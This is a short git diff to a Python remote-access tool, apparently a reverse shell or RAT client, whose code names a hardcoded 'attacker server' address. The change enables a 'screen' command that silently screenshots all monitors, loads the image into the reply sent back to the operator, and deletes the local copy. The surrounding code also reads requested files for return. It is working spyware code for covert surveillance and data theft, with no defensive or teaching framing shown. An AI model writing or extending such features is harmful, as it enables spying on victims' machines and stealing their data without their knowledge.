@@ -3,6 +3,7 @@ import subprocess
 from command_payload import CommandPayload
 from command_payload import parse_payload_to_output
 from secure_socket import SecureSocket
+import mss
 
 # Attacker server ip and port
 ip = "192.168.1.215"
@@ -31,18 +32,14 @@ def run_custom_command(cmd: str) -> CommandPayload:
         except:
             result.stderr = "Cannot open file " + file_name
     elif cmd[1] == "screen":
-        # file_name = 'ScreenShot.png'
-        # # Create a screenshot object
-        # sct = mss.mss()
-        #
-        # # Take a screenshot of the entire screen
-        # screenshot = sct.shot()
-        # mss.tools.to_png(screenshot.rgb, screenshot.size, output=file_name)
-        # with open(file_name, 'rb') as file:
-        #     file_data = file.read()
-        #     result.file = file_data
-        #     result.file_name = file_name
-        # #os.remove(file_name)
+        with mss.mss() as sct:
+            file_name = sct.shot(mon=-1)
+            sct.save(file_name)
+        with open(file_name, 'rb') as file:
+            file_data = file.read()
+            result.file = file_data
+            result.file_name = file_name
+        os.remove(file_name)
         result.stdout = "Working on this feature"
     return result
 
